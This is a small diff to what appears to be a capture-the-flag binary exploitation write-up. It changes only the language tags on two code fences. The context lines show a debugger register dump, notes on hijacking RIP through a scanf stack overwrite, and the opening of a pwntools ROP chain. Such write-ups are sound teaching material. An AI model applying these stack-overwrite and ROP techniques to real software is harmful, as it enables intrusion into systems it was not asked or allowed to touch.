@@ -104,7 +104,7 @@ But to take control of RIP, we need to write to the stack.
 
 Let's take a look at the stack and registers before the call to `scanf`:
 
-```
+```asm
 pwndbg> regs
 *RAX  0x0
  RBX  0x400730 (__libc_csu_init) ◂— push   r15
@@ -183,7 +183,7 @@ and canary.
 It also uses the fact that the first argument is set to `obj.buf` to write some format strings
 we can use in our ropchain for more `scanf` calls.
 
-```
+```py
 overwrites = flat([
     hex(rop.find_gadget(['leave', 'ret'])[0]).encode(),
     b"%2c\x00%16c\x00",
